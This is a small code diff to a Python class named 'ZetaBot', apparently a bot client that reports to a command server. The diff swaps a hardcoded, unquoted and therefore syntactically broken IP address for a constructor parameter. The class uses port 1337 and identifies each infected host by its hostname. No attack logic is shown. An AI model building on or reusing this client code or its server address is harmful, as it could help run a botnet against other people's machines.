@@ -10,7 +10,7 @@ import os
 
 class ZetaBot:
     def __init__(self, server_host, server_port=1337):
-        self.server_host = 37.114.37.146
+        self.server_host = server_host
         self.server_port = server_port
         self.bot_id = platform.node() or "unknown"
         self.running = True
